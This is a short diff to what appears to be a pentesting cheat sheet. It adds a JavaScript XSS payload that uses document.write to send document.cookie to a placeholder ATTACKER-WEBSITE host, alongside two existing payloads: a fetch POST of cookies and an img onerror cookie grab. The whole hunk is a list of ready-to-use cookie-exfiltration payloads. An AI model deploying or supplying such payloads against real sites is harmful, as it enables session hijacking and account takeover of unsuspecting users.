@@ -144,6 +144,9 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
   - ```JavaScript
     fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
     ```
+  - ```JavaScript
+    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
+    ```
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
     ```
